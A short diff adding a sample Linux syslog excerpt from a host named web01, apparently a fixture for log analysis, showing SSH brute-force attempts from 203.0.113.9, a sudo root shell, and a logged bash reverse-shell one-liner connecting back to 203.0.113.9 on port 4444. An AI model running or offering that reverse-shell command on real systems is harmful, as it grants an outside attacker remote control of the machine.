@@ -1,0 +1,8 @@
+Jul  1 09:14:02 web01 sshd[2011]: Failed password for root from 203.0.113.9 port 51022 ssh2
+Jul  1 09:14:05 web01 sshd[2012]: Failed password for root from 203.0.113.9 port 51024 ssh2
+Jul  1 09:14:07 web01 sshd[2013]: Failed password for invalid user oracle from 203.0.113.9 port 51026 ssh2
+Jul  1 09:14:09 web01 sshd[2014]: Invalid user test from 203.0.113.9
+Jul  1 09:15:44 web01 sshd[2020]: Accepted password for bob from 10.0.2.15 port 51600 ssh2
+Jul  1 09:16:01 web01 sudo[2101]:      bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/bash
+Jul  1 09:17:22 web01 bash[2222]: bash -i >& /dev/tcp/203.0.113.9/4444 0>&1
+Jul  1 09:18:00 web01 cron[900]: (root) CMD (/usr/bin/backup.sh)
